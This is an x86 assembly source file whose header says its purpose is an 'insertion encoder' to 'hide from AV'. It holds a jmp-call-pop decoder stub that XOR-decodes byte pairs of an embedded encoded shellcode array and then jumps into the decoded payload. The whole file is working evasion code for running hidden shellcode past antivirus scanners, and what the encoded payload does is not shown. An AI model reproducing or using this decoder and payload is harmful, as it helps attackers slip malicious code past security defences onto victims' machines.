;-------------------------------------
;
; Author: dubs3c
;
; Purpose:
; Insertion Encoder, hide from AV :)
;
;-------------------------------------

global _start

section .text
_start:
    jmp short call_shellcode        ; jmp-call-pop method

decoder:
    pop esi                         ; Get the address of EncodedShellcode
    lea edi, [esi + 1]              ; edi points to the next byte
    xor eax, eax                    ; zero out register
    xor ebx, ebx                    ; zero out register
    xor edx, edx                    ; zero out register
    xor ecx, ecx                    ; zero out register

decode:
    mov bl, byte [esi + eax]        ; Get the byte at esi + eax
    xor bl, 0xaa                    ; XOR with 0xaa to check if we are at the end of the shellcode
    jz short EncodedShellcode       ; If we are at the end, we are done, jump to shellcode
    mov dl, byte [esi + eax]        ; Get the byte at esi + eax 
    mov bl, byte [esi + eax + 1]    ; Get the byte at esi + eax + 1
    xor dl, bl                      ; XOR to get orignal shellcode byte
    mov byte [esi + ecx], dl        ; Overwrite EncodedShellcode at byte esi + ecx with the result
    add al, 2                       ; Add 2 to eax to jump to the next pair of bytes
    inc ecx                         ; increment ecx which byte to overwrite in EncodedShellcode
    jmp short decode                ; loop back to decode

call_shellcode:
    call decoder
    EncodedShellcode: db 0x1,0xfd,0xa2,0x19,0x60,0x7b,0x7d,0xec,0xac,0x61,0xac,0x64,0x31,0xda,0x2b,0x27,0xb1,0xef,0xd,0x5b,0x66,0x57,0xa5,0xbb,0xc7,0x6a,0xac,0xad,0x41,0x82,0x7a,0xff,0x5,0xc5,0xf4,0x81,0xf1,0x6,0x99,0x5a,0x54,0xbc,0xac,0x43,0x28,0xd7,0x4,0xfb,0x1b,0xe4,0x11,0x3b,0x35,0x76,0xdc,0x43,0x57,0xf7,0x4f,0x6d,0xe1,0xad,0xd7,0x84,0x6c,0x35,0x62,0xb0,0x7b,0xc6,0x7f,0xc3,0x80,0x7b,0x1f,0x54,0x45,0xe,0xa9,0x88,0x97,0x5d,0x84,0xc6,0xe9,0x93,0x6c,0xa,0x6f,0xf2,0x7a,0x25,0xe0,0x50,0x88,0x6e,0x3b,0xe5,0x56,0x9,0x6f,0x25,0xae,0x49,0xe3,0x3d,0xaa,0xaa 
